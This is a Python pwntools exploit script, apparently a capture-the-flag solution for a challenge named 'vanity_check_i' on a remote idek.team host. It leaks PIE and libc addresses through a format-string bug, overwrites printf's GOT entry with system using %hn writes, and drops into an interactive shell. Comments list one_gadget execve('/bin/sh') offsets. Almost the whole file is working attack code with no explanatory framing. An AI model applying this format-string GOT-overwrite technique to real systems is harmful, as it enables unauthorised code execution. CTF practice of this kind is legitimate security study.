from pwn import *

# 0xe6c7e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
#
# 0xe6c81 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL
#
# 0xe6c84 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

context.arch = "amd64"

p = remote('vanity-check-i.idek.team', 1337) #process('./vanity_check_i')
elf = ELF('./libc-2.31.so')

p.recvuntil(b'\n')
p.sendline(b'%35$p %41$p')
p.recvuntil(b'0x')
leak = int(p.recv(12), 16)
print("leak " + hex(leak - 0x1270))
p.recvuntil(b'0x')
libc_leak = int(p.recv(12), 16)
libc_base = libc_leak - 0x270b3  #0x224620 #0x221190 #0x26D0A
pie_base = leak - 0x1270
printf_got = pie_base + 0x33c0
print("pie base @ " + hex(pie_base))
print("libc base @ " + hex(libc_base))
elf.address = libc_base
print("printf got @ " + hex(printf_got))
print("system @ " + hex(elf.sym.system))
print(hex(elf.sym.system)[6:-4])
print(str(int("1"+hex(elf.sym.system)[6:-4], 16) - int(hex(elf.sym.system)[-4:], 16)))

payload = b""
payload += b"%"+ bytes(str(int(hex(elf.sym.system)[-4:], 16)-len(payload)), 'utf-8')+ b"x"
payload += b"%31$hn"
payload += b"%" + bytes(str(int("1"+hex(elf.sym.system)[6:-4], 16) - int(hex(elf.sym.system)[-4:], 16)), 'utf-8')+ b"x"
payload += b"%32$hn"
payload += b"A"*(200 - len(payload))
payload += p64(printf_got)
payload += p64(printf_got+2)
p.sendline(payload)

p.interactive()
